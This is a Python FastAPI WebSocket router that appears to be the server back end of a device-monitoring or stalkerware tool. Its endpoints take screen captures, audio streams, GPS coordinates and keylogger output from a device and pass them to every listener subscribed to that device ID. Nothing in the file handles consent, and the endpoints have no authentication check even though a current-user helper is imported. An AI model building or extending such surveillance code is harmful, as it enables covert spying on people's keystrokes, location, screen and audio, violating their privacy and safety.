from fastapi import APIRouter, WebSocket, WebSocketDisconnect, Depends
from sqlalchemy.ext.asyncio import AsyncSession
from typing import Dict, Set
from ..database import get_db
from ..models import Device, User
from ..utils import get_current_user
import json
from datetime import datetime

router = APIRouter(prefix="/ws", tags=["websocket"])

# Store active connections
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[int, Set[WebSocket]] = {}

    async def connect(self, websocket: WebSocket, device_id: int):
        await websocket.accept()
        if device_id not in self.active_connections:
            self.active_connections[device_id] = set()
        self.active_connections[device_id].add(websocket)

    def disconnect(self, websocket: WebSocket, device_id: int):
        self.active_connections[device_id].remove(websocket)
        if not self.active_connections[device_id]:
            del self.active_connections[device_id]

    async def broadcast_to_device(self, message: str, device_id: int):
        if device_id in self.active_connections:
            for connection in self.active_connections[device_id]:
                await connection.send_text(message)

manager = ConnectionManager()

@router.websocket("/device/{device_id}/monitor")
async def monitor_device(websocket: WebSocket, device_id: int, db: AsyncSession = Depends(get_db)):
    """WebSocket endpoint for real-time device monitoring"""
    try:
        await manager.connect(websocket, device_id)
        
        while True:
            data = await websocket.receive_text()
            try:
                message = json.loads(data)
                # Handle different types of monitoring data
                if message.get("type") == "screen_capture":
                    await manager.broadcast_to_device(
                        json.dumps({
                            "type": "screen_update",
                            "data": message["data"],
                            "timestamp": datetime.utcnow().isoformat()
                        }),
                        device_id
                    )
                elif message.get("type") == "audio_stream":
                    await manager.broadcast_to_device(
                        json.dumps({
                            "type": "audio_update",
                            "data": message["data"],
                            "timestamp": datetime.utcnow().isoformat()
                        }),
                        device_id
                    )
                elif message.get("type") == "gps_update":
                    await manager.broadcast_to_device(
                        json.dumps({
                            "type": "location_update",
                            "latitude": message["latitude"],
                            "longitude": message["longitude"],
                            "timestamp": datetime.utcnow().isoformat()
                        }),
                        device_id
                    )
                elif message.get("type") == "keylog":
                    await manager.broadcast_to_device(
                        json.dumps({
                            "type": "keylog_update",
                            "data": message["data"],
                            "timestamp": datetime.utcnow().isoformat()
                        }),
                        device_id
                    )
            except json.JSONDecodeError:
                await websocket.send_text("Invalid message format")
                
    except WebSocketDisconnect:
        manager.disconnect(websocket, device_id)

@router.websocket("/device/{device_id}/audio")
async def audio_stream(websocket: WebSocket, device_id: int, db: AsyncSession = Depends(get_db)):
    """WebSocket endpoint for real-time audio streaming"""
    try:
        await manager.connect(websocket, device_id)
        
        while True:
            audio_data = await websocket.receive_bytes()
            # Process and broadcast audio data
            await manager.broadcast_to_device(
                json.dumps({
                    "type": "audio_stream",
                    "data": audio_data.hex(),  # Convert bytes to hex string for JSON
                    "timestamp": datetime.utcnow().isoformat()
                }),
                device_id
            )
            
    except WebSocketDisconnect:
        manager.disconnect(websocket, device_id)